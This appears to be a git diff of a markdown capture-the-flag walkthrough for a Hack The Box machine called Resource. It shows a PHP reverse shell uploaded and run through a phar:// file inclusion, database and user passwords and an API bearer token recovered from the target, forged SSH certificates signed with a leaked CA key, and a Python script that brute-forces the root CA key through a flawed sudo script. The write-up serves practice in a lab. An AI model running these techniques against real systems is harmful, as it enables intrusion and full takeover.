@@ -3,16 +3,16 @@
 ##Recon
 
 enumerating open ports with Rustscan 
-
-`rustscan -a 10.129.173.4 --ulimit 9000 -- -sC -A`
-
+```
+rustscan -a 10.129.173.4 --ulimit 9000 -- -sC -A
+```
 Output 
 rustscan.png
 
 adding it to hosts file 
-
+```
 sudo nano /etc/hosts
-
+```
 whatweb scan redirects to http://itrc.ssg.htb/ adding it to hosts
 
 
@@ -39,7 +39,7 @@ lets upload pentestmonkeys rev shell
 
 shell.php
 
-`
+```php
   <?php
   // php-reverse-shell - A Reverse Shell implementation in PHP
   // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
@@ -188,36 +188,38 @@ shell.php
   }
 
   ?> 
-  `
-
+```
 make a zip file of shell.php
 
 and upload as a ticket 
 
 Click on the ticket and copy the shell.zip file path 
-
-`http://itrc.ssg.htb/uploads/b1b6433555455fe26b08ad6b9290c333268597ec.zip`
-
+```
+http://itrc.ssg.htb/uploads/b1b6433555455fe26b08ad6b9290c333268597ec.zip
+```
 modify the above path with PHAR (PHP Archive) payload and open a netcat listner 
-
-`nc -lnvp 6969`
-
-`http://itrc.ssg.htb/?page=phar://uploads/b1b6433555455fe26b08ad6b9290c333268597ec.zip/shell`
+```
+nc -lnvp 6969
+```
+```
+http://itrc.ssg.htb/?page=phar://uploads/b1b6433555455fe26b08ad6b9290c333268597ec.zip/shell
+```
 
 so if your file name is shell.php then you should execute as "hash.zip/shell"
 
 Voila got the reverse shell
 
 in the home dir there are two users 
-`
+```
 msainristil
 zzinter
-`
+```
 
 exploring the web dir in /var/www/itrc/
  found db.php with mysql db user pass
 
-`cat db.php
+```php
+cat db.php
 <?php
 
 $dsn = "mysql:host=db;dbname=resourcecenter;";
@@ -230,15 +232,16 @@ try {
 } catch (PDOException $e) {
     die("Connection failed: " . $e->getMessage());
 }$ 
-$ `
+$
+```
 
 
 getting error while logging with jj
-
-`mysql -u jj -p
+```
+mysql -u jj -p
 ugEG5rR5SG8uPd
 ERROR 2002 (HY000): Can't connect to local server through socket '/run/mysqld/mysqld.sock' (2) 
-`
+```
 
 so someone did a reset to the machine and i found there are two zips but i just uploaded my zip 
 downloaded the zip file and explored it 
@@ -249,7 +252,8 @@ downloaded the zip file and explored it
 inside the zip file there is a long JSON log file 
 
 and BAM!! we got the user ID and PASS in this
-`          "headersSize": 647,
+```json
+         "headersSize": 647,
           "bodySize": 37,
           "postData": {
             "mimeType": "application/x-www-form-urlencoded",
@@ -266,7 +270,7 @@ and BAM!! we got the user ID and PASS in this
             ]
           }
         },
-`
+```
 msainristil:82yards2closeit
 
 
@@ -274,15 +278,17 @@ Still no user flag
 
 but there are some ssh pub keypair in folder
 
-`msainristil@itrc:~/decommission_old_ca$ ls
+```
+msainristil@itrc:~/decommission_old_ca$ ls
 ca-itrc  ca-itrc.pub
-`
+```
 
 so both of the files are used signing and authorizing keys 
 
 we need to create a key and sign it wil ca-itrc
 
-`msainristil@itrc:~/decommission_old_ca$ ssh-keygen -t rsa -b 2048 -f sed
+```
+msainristil@itrc:~/decommission_old_ca$ ssh-keygen -t rsa -b 2048 -f sed
 Generating public/private rsa key pair.
 Enter passphrase (empty for no passphrase): 
 Enter same passphrase again: 
@@ -304,19 +310,21 @@ The key's randomart image is:
 +----[SHA256]-----+
 msainristil@itrc:~/decommission_old_ca$ ls
 ca-itrc  ca-itrc.pub  sed  sed.pub
-`
+```
 we now have a dummy keypair now we have to sign it with ca-itrc with zzinter user
 
-`msainristil@itrc:~/decommission_old_ca$ ssh-keygen -s ca-itrc -n zzinter -I xx sed.pub 
+```
+msainristil@itrc:~/decommission_old_ca$ ssh-keygen -s ca-itrc -n zzinter -I xx sed.pub 
 Signed user key sed-cert.pub: id "xx" serial 0 for zzinter valid forever
-`
+```
 
 lets login with the following keypair
 
 YESSSS!!! LOGGED IN WITH ZZINTER 
 AND GOT THE USER FLAG
 
-`msainristil@itrc:~/decommission_old_ca$ ssh -i sed  zzinter@resource.htb
+```
+msainristil@itrc:~/decommission_old_ca$ ssh -i sed  zzinter@resource.htb
 Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -328,14 +336,14 @@ permitted by applicable law.
 zzinter@itrc:~$ ls
 sign_key_api.sh  user.txt
 zzinter@itrc:~$ cat user.txt 
-de9a6e522bfec9a0d4de84065c01c1f7
-`
+```
 ##Privilage Escalation
 
 
 inside the user dir we have a file sign_key_api.sh 
 
-`#!/bin/bash
+```php
+#!/bin/bash
 
 usage () {
     echo "Usage: $0 <public_key_file> <username> <principal>"
@@ -373,7 +381,7 @@ fi
 public_key=$(cat $public_key_file)
 
 curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
-`
+```
 
 
 this seems like an API for siginig public keys 
@@ -382,23 +390,25 @@ copying it to my local machine and lets see
 it redirects to `signserv.ssg.htb/v1/sign`
 
 adding it to hosts 
- `nano /etc/hosts`
- 
+```
+ nano /etc/hosts
+``` 
  ran linpeas.sh and came to know that we're in a docker container need to escape to the host machine 
 
 the machine hostname is "ssg"
 
 running the file found in user's dir 'sign_key_api.sh '
 
+```chmod +x sign_key_api.sh```
 
-`chmod +x sign_key_api.sh`
-`./sign_key_api.sh sed.pub support support > support.cert`
+```./sign_key_api.sh sed.pub support support > support.cert```
 
 Note: to run the api in your home machine or PWNBox you need to add signserv.ssg.htb to your '/etc/hosts' file
 
 signing in with support.cert and supoort user
-`ssh support@resource.htb -p 2222 -i sed -o CertificateFile=support.cert 
-`
+```
+ssh support@resource.htb -p 2222 -i sed -o CertificateFile=support.cert 
+```
 
 we're in the support user in host machine i.e. 'ssg'
 
@@ -418,18 +428,21 @@ putting the username and role in the user dir file i.e. sign_key_api.sh
 
 after making changes to the sign key script run:
 
-`./sign_key_api.sh sed.pub zzinter zzinter_temp > zzinter.cert
-`
+```
+./sign_key_api.sh sed.pub zzinter zzinter_temp > zzinter.cert
+```
 got the access in zzinter@ssg machine using 
 
-`ssh zzinter@resource.htb -p 2222 -i sed -o CertificateFile=zzinter.cert 
-`
+```
+ssh zzinter@resource.htb -p 2222 -i sed -o CertificateFile=zzinter.cert 
+```
 checking permissions with sudo -l 
  found we can execute  /opt/sign_key.sh file as root
  
  exploring the file 
  
- `zzinter@ssg:~$ cat /opt/sign_key.sh 
+ `zzinter@ssg:~$ cat /opt/sign_key.sh `
+ ```bash
 #!/bin/bash
 
 usage () {
@@ -519,14 +532,14 @@ else
     echo 'b does not match a'
 fi
 
-`
+```
 the first if statement, == checks for exact equality. Since "Hell*" is not equal to "Hello I am Sed", this condition will also be false. Because the condition is false, echo 'a==b' will not be executed.
 But in the second statement 'Hell' is present the condition will be executed
 
 wrote a python script to return the root CA certificate 
 
 
-`
+```python
 import subprocess
 import string
 
@@ -580,7 +593,7 @@ if __name__ == '__main__':
         file.close()
     else:
         exit("\n\nFail\n") 
-`
+```
 
 
 the exploit will take some time to bruteforce key file
@@ -588,28 +601,30 @@ the exploit will take some time to bruteforce key file
 after the successfully executing the script save the ssh private key in your local machine as root.key
 
 then do 
-`ssh-keygen -f root
+```bash
+ssh-keygen -f root
+```
 
-	//Edit the private key:
+Edit the private key:
+Open the private key file in a text editor:
 
- 	//Open the private key file in a text editor:
-
-
+```
 nano root.key
-
-	//Place the provided key content in the file:
+```
+Place the provided key content in the file:
+```
 chmod 600 root.key
-
-	//Sign the public key to create a certificate:
-
+```
+Sign the public key to create a certificate:
+```
 
 ssh-keygen -s root.key -z 200 -I root -V -10w:forever -n root_user root.pub
-`
+```
 
 Finally Connect to the target machine using the signed certificate:
 
 
-`ssh root@itrc.ssg.htb -p2222 -i root -i root-cert.pub`
+```ssh root@itrc.ssg.htb -p2222 -i root -i root-cert.pub```
 
 ANDDD WE GOT THE ROOT FLAGGG!!!!!
 
